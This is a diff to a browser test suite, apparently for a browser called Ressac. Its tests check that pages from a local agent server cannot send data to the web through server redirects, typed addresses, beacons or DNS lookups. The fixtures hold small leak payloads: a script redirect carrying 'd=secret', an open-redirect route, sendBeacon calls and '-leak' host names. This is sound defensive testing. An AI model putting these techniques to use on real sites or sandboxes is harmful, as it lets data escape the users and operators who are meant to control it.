@@ -22,7 +22,14 @@ let m: Marionette;
 let logDir: string;
 beforeAll(async () => {
   logDir = await mkdtemp(path.join(os.tmpdir(), "ressac-dnslog-"));
-  web = await startServer({ routes: { "/arrive": html("<title>arrive</title>") } });
+  web = await startServer({
+    routes: {
+      "/arrive": html("<title>arrive</title>"),
+      // A web page that navigates through the agent's server, which redirects it to the web.
+      "/via-agent": (req, res) =>
+        html(`<title>via</title><script>location = "http://localhost:${agent.port}/r?to=" + encodeURIComponent("${web.url}/via-agent-leak?d=secret")</script>`)(req, res),
+    },
+  });
   const to = web.url;
   agent = await startServer({
     routes: {
@@ -32,6 +39,7 @@ beforeAll(async () => {
       ),
       "/beacon": html(`<title>beacon</title><script>addEventListener("pagehide", () => navigator.sendBeacon("${to}/beacon?d=1", "x"))</script>`),
       "/link": html(`<title>link</title><a id="out" href="${to}/arrive">out</a>`),
+      "/r": (req: any, res: any) => res.writeHead(302, { Location: new URL(req.url, "http://x").searchParams.get("to") }).end(),
       // A secret as a host name: the cancel must come before its DNS lookup.
       "/dns": html(`<title>dns</title><img src="http://img-leak.${SFX}:${web.port}/p.png"><script>fetch("http://fetch-leak.${SFX}:${web.port}/f").catch(() => {}); try { new WebSocket("ws://ws-leak.${SFX}:${web.port}/w"); } catch (e) {}</script>`),
     },
@@ -96,4 +104,31 @@ it("an agent page's request or WebSocket to a public name is cancelled before it
   await expect.poll(() => resolvedNames(logDir), { timeout: 15_000 }).toContain("witness");
   const names = await resolvedNames(logDir);
   expect(names.filter((n) => n.endsWith("-leak"))).toEqual([]);
+});
+
+// An address the user types is Ressac's load (the system principal), but the redirect is the agent server's choice.
+const typed = (url: string) =>
+  m.execute("gBrowser.selectedBrowser.loadURI(Services.io.newURI(arguments[0]), { triggeringPrincipal: Services.scriptSecurityManager.getSystemPrincipal() })", [url]);
+
+it("a typed address of an agent page that redirects to the web does not leave; one that redirects to its own pages does", async () => {
+  await open(`http://localhost:${agent.port}/link`);
+  const before = web.paths.length;
+  const asked = agent.paths.length;
+  await typed(`http://localhost:${agent.port}/r?to=${encodeURIComponent(`${web.url}/typed-redirect?d=secret`)}`);
+  // The redirect was answered and the load is over (blocked: the tab stays; let through: the web page).
+  await expect.poll(() => agent.paths.slice(asked)).toContain("/r");
+  await waitFor(m, "return !gBrowser.selectedBrowser.webProgress.isLoadingDocument", (v) => v === true);
+  expect(web.paths.slice(before)).toEqual([]);
+  await typed(`http://localhost:${agent.port}/r?to=${encodeURIComponent(`http://localhost:${agent.port}/link?after`)}`);
+  await waitFor(m, "return gBrowser.selectedBrowser.currentURI.spec", (v) => v === `http://localhost:${agent.port}/link?after`);
+});
+
+it("a web page's navigation that the agent's server redirects to the web does not leave", async () => {
+  const before = web.paths.length;
+  const asked = agent.paths.length;
+  await dispatch(m, { type: "openTab", windowId: (await state(m)).windows[0]!.id, url: `${web.url}/via-agent`, activate: true });
+  // The agent's server answered the redirect and the load is over (blocked: an error page; let through: the web).
+  await expect.poll(() => agent.paths.slice(asked)).toContain("/r");
+  await waitFor(m, "return !gBrowser.selectedBrowser.webProgress.isLoadingDocument", (v) => v === true);
+  expect(web.paths.slice(before).filter((p) => p.startsWith("/via-agent-leak"))).toEqual([]);
 });
